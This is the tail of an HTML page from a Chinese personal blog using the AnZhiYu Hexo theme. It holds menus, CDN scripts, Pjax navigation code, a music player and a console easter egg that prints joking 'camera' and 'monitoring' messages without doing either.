href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("31/8/2024 22:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 xxshh 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
